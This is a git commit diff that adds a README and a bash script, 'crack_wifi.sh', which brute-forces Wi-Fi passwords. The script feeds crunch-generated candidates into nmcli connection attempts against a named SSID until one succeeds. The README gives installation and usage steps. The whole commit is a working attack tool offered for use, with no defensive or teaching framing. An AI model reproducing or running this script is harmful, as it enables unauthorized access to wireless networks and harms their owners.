b2b48885f7cc141fbf43e2d2b730a10c20c4bf22
Nanfack Steve <nanfacksteve7@gmail.com>
2023-02-25 11:48:20 +0100

    original commit - version 1.0

--- README.md
+++ README.md
@@ -1,3 +1,21 @@
 # Wifi Cracker 📡📶🔓
 
-Crack a wifi by Brut-force method
+Crack a wifi by <b>Brut-force</b> method.
+
+## Description
+<ul>
+    <li> <em>charset.lst</em> file contains list of caracters in present in wifi password
+    <li> <em>crack_wifi</em> is the main file to be execute
+</ul>
+
+## Pre-requise
+1.  Use <b>GNU/Linux</b> Debian OS family.
+2.  Install the <b>crunch</b> with `sudo apt install crunch`
+3.  Execute `chmod +x /path/to/script/crack_wifi.sh`
+4.  (optional) Copy the script to path `cp /path/to/script/crack_wifi.sh /usr/bin`
+
+## How to use ?
+
+```
+crunch min max -f shcharset.lst pass | crack_wifi.sh SSID Wait_Time 
+```
---
+++ crack_wifi.sh
@@ -0,0 +1,45 @@
+#!/bin/bash
+#encoding: utf-8
+
+#####################################################################################
+#                                                                                   #
+# [ Created At ]   : 24-02-2023                                                     #
+# [ LastUpdate ]   : 24-02-2023                                                     #
+# [ Description ]  : Crack wifi password by Brut-froce (Test each combination)      #
+# [ Author(s) ]    : Mr MANI OMGBA(BUNEC) / NANFACK STEVE                           #
+# [ email(s) ]     : gaelomgba4@gmail.com / nanfacksteve7@gmail.com                 #
+#                                                                                   #
+#####################################################################################
+
+declare -a args=("$@")
+SSID=$1
+wait_Time=$2
+state=false
+
+# Color's Message
+grn='\e[1;32m' && red='\e[1;31m' && blu='\e[1;96m' && wht='\e[1;97m' && ylw='\e[1;93m' && nc='\e[0m'
+
+# Check if Wifi-SSID exist
+[[ -z "$(nmcli device wifi list | egrep -o "$SSID")" ]] && echo -e "\n$red[ Error ]$nc : No Wifi named [$ylw $SSID $nc] found ! \n" && exit 1
+
+#[[ -p /dev/stdin ]] && mapfile -t -O ${#args[@]} args && set -- "${args[@]}"
+if [ -p /dev/stdin ]; then
+
+  while read -r passwrd; do
+
+    echo -e "$wht\nCheck this password : [$ylw $passwrd $nc]"
+    nmcli -w $wait_Time device wifi connect $SSID password $passwrd /dev/null 1>&2
+
+    if [[ $? -ne 0 ]]; then
+      echo -e "$red[ Error ]$nc : Incorrect password 😡, trying next one ...🤔"
+
+    else
+      echo -e "$grn\n[ OK ]$nc : 🔐 🤩 Passord found 🥳 🔓 ! [ $grn$passwrd $nc]\n"
+      state=true
+      break
+
+    fi
+  done < <(cat /dev/stdin) # read datas from pipe
+fi
+
+if [ $state = false ]; then echo -e "$wht\nSorry...😢 $ylw no password found on this range$nc. Try another \n"; fi
